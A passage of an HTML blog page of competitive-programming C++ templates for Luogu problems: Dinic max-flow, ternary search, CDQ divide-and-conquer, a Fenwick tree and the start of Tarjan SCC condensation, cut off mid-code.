class="number">9</span>;</span><br><span class="line"><span class="type">int</span> n, m, e, s, t, head[N], pre[N], level[N], que[N], cnt = <span class="number">1</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> ans;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">EDGE</span>&#123;<span class="type">int</span> to, nex;<span class="type">long</span> <span class="type">long</span> flow;&#125;edge[(N + M) &lt;&lt; <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x, <span class="type">long</span> <span class="type">long</span> rest)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x == t) <span class="keyword">return</span> rest;</span><br><span class="line">	<span class="keyword">register</span> <span class="type">long</span> <span class="type">long</span> flow = <span class="number">0</span>, f = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> &amp;i = pre[x]; i; i = edge[i].nex) &#123;</span><br><span class="line">		<span class="keyword">if</span> (level[x] + <span class="number">1</span> == level[edge[i].to] &amp;&amp; edge[i].flow) &#123;</span><br><span class="line">			f = <span class="built_in">dfs</span>(edge[i].to, <span class="built_in">min</span>(rest - flow, edge[i].flow));</span><br><span class="line">			flow += f, edge[i].flow -= f, edge[i ^ <span class="number">1</span>].flow += f;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!flow) level[x] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> flow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bfs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(level, <span class="number">0</span>, <span class="built_in">sizeof</span>(level));</span><br><span class="line">	<span class="keyword">register</span> <span class="type">int</span> H = <span class="number">1</span>, T = <span class="number">0</span>; que[<span class="number">1</span>] = s, level[s] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (T &lt; H) &#123;</span><br><span class="line">		<span class="type">int</span> now = que[++T];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = head[now]; i; i = edge[i].nex) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!level[edge[i].to] &amp;&amp; edge[i].flow) &#123;</span><br><span class="line">				level[edge[i].to] = level[now] + <span class="number">1</span>;</span><br><span class="line">				que[++H] = edge[i].to;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> level[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dinic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">bfs</span>()) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) pre[i] = head[i];</span><br><span class="line">		ans += <span class="built_in">dfs</span>(s, INF);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(m, n, e);</span><br><span class="line">    n += m;</span><br><span class="line">    s = n + <span class="number">1</span>, t = n + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>, u = <span class="number">0</span>, v = <span class="number">0</span>; i &lt;= e; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(u, v);</span><br><span class="line">        v += m;</span><br><span class="line">        edge[++cnt] = (EDGE)&#123;v, head[u], <span class="number">1</span>&#125;, head[u] = cnt;</span><br><span class="line">		edge[++cnt] = (EDGE)&#123;u, head[v], <span class="number">0</span>&#125;, head[v] = cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">        edge[++cnt] = (EDGE)&#123;i, head[s], <span class="number">1</span>&#125;, head[s] = cnt;</span><br><span class="line">		edge[++cnt] = (EDGE)&#123;s, head[i], <span class="number">0</span>&#125;, head[i] = cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = m + <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        edge[++cnt] = (EDGE)&#123;t, head[i], <span class="number">1</span>&#125;, head[i] = cnt;</span><br><span class="line">		edge[++cnt] = (EDGE)&#123;i, head[t], <span class="number">0</span>&#125;, head[t] = cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    n += <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">dinic</span>();</span><br><span class="line">	<span class="built_in">print</span>(ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="三分法"><a href="#三分法" class="headerlink" title="三分法"></a>三分法</h1><p><strong>洛谷P3382</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> eps 1e-7</span></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">double</span> l, r;</span><br><span class="line"><span class="type">double</span> x[<span class="number">14</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">f</span><span class="params">(<span class="type">double</span> t)</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="type">double</span> e = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; ++j) e *= t;</span><br><span class="line">        ans += e * x[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; l &gt;&gt; r;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        cin &gt;&gt; x[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">double</span> lmid = l + (r - l) / <span class="number">3</span>, rmid = r - (r - l) / <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">while</span> (rmid - lmid &gt; eps) &#123;</span><br><span class="line">        <span class="type">double</span> lv = <span class="built_in">f</span>(lmid), rv = <span class="built_in">f</span>(rmid);</span><br><span class="line">        <span class="keyword">if</span> (lv &gt; rv) r = rmid;</span><br><span class="line">        <span class="keyword">else</span> l = lmid;</span><br><span class="line">        lmid = l + (r - l) / <span class="number">3</span>, rmid = r - (r - l) / <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; fixed &lt;&lt; <span class="built_in">setprecision</span>(<span class="number">5</span>) &lt;&lt; lmid;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="三维偏序"><a href="#三维偏序" class="headerlink" title="三维偏序"></a>三维偏序</h1><p><strong>洛谷P3810</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">9</span>, K = <span class="number">2e5</span> + <span class="number">9</span>;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NODE</span>&#123;<span class="type">int</span> a, b, c, ans, cnt;&#125;d[N], s[N], temp[N];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmod1</span><span class="params">(NODE a, NODE b)</span> </span>&#123;<span class="keyword">return</span> a.a == b.a ? (a.b == b.b ? a.c &lt; b.c : a.b &lt; b.b) : a.a &lt; b.a;&#125;</span><br><span class="line"><span class="type">int</span> n, k, cnt, tree[K], ans[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> pos, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = pos; i &lt;= k; i += i &amp; (-i)) &#123;</span><br><span class="line">        tree[i] += val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = pos; i &gt;= <span class="number">1</span>; i -= i &amp; (-i)) &#123;</span><br><span class="line">        ans += tree[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CDQ</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l == r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">CDQ</span>(l, mid); <span class="built_in">CDQ</span>(mid + <span class="number">1</span>, r);</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> p = l, q = mid + <span class="number">1</span>, t = l;</span><br><span class="line">    <span class="keyword">while</span> (p &lt;= mid &amp;&amp; q &lt;= r) &#123;</span><br><span class="line">        <span class="keyword">if</span> (d[p].b &lt;= d[q].b) &#123;</span><br><span class="line">            <span class="built_in">add</span>(d[p].c, d[p].cnt);</span><br><span class="line">            temp[t++] = d[p++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            d[q].ans += <span class="built_in">query</span>(d[q].c);</span><br><span class="line">            temp[t++] = d[q++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (q &lt;= r) d[q].ans += <span class="built_in">query</span>(d[q].c), temp[t++] = d[q++];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = l; i &lt; p; ++i) <span class="built_in">add</span>(d[i].c, -d[i].cnt);</span><br><span class="line">    <span class="keyword">while</span> (p &lt;= mid) temp[t++] = d[p++];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = l; i &lt;= r; ++i) d[i] = temp[i];</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n, k);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(s[i].a, s[i].b, s[i].c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(s + <span class="number">1</span>, s + <span class="number">1</span> + n, cmod1);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        d[++cnt] = (NODE)&#123;s[i].a, s[i].b, s[i].c, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n &amp;&amp; s[i].a == s[i + <span class="number">1</span>].a &amp;&amp; s[i].b == s[i + <span class="number">1</span>].b &amp;&amp; s[i].c == s[i + <span class="number">1</span>].c) ++d[cnt].cnt, ++i, ++d[cnt].ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CDQ</span>(<span class="number">1</span>, cnt);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= cnt; ++i) &#123;</span><br><span class="line">        ans[d[i].ans] += d[i].cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">print</span>(ans[i]), <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="树状数组"><a href="#树状数组" class="headerlink" title="树状数组"></a>树状数组</h1><p><strong>洛谷P3374</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">5e5</span> + <span class="number">9</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> tree[N];</span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">ask</span><span class="params">(<span class="type">int</span> pos)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = pos; i &gt;= <span class="number">1</span>; i -= i &amp; (-i)) &#123;</span><br><span class="line">        ans += tree[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> pos, <span class="type">long</span> <span class="type">long</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = pos; i &lt;= n; i += i &amp; (-i)) &#123;</span><br><span class="line">        tree[i] += val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n, m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>, val = <span class="number">0</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(val);</span><br><span class="line">        <span class="built_in">modify</span>(i, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>, opt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">long</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="built_in">read</span>(opt);</span><br><span class="line">        <span class="keyword">if</span> (opt == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">read</span>(x, k);</span><br><span class="line">            <span class="built_in">modify</span>(x, k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">read</span>(x, y);</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">ask</span>(y) - <span class="built_in">ask</span>(x - <span class="number">1</span>)), <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="缩点"><a href="#缩点" class="headerlink" title="缩点"></a>缩点</h1><p><strong>洛谷P3387</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e4</span> + <span class="number">9</span>;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; G[N], Gscc[N], scc[N];</span><br><span class="line"><span class="type">int</span> scccnt, dfncnt, stktop, n, m, val[N], dfn[N], low[N], stk[N], vis[N], col[N], sccval[N], sccdeg[N], que[N], dp[N], head, tail;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tarjan</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">	dfn[x] = low[x] = ++dfncnt;</span><br><span class="line">	stk[++stktop] = x;</span><br><span class="line">	vis[x] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> val : G[x]) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!dfn[val]) &#123;</span><br><span class="line">			<span class="built_in">tarjan</span>(val);</span><br><span class="line">			low[x] = <span class="built_in">min</span>(low[x], low[val]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (vis[val]) &#123;</span><br><span class="line">			low[x] = <span class="built_in">min</span>(low[x], low[val]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (low[x] == dfn[x]) &#123;</span><br><span class="line">		col[x] = ++scccnt;</span><br><span class="line">		sccval[scccnt] += val[x];</span><br><span class="line">		vis[x] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (stk[stktop] != x) &#123;</span><br><span class="line">			vis[stk[stktop]] = <span class="number">0</span>;</span><br><span class="line">			sccval[scccnt] += val[stk[stktop]];</span><br><span class="line">			col[stk[stktop--]] = scccnt;</span><br><span class="line">		&#125;</span><br><span class="line">		--stktop;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(n, m);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) <span class="built_in">read</span>(val[i]);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>, x = <span class="number">0</span>, y = <span class="number">0</span>; i &lt;= m; ++i)&#123;</span><br><span class="line">		<span class="built_in">read</span>(x, y);</span><br><span class="line">		G[x].<span class="built_in">push_back</span>(y);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!dfn[i]) &#123;</span><br><span class="line">			<span class="built_in">tarjan</span>(i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i 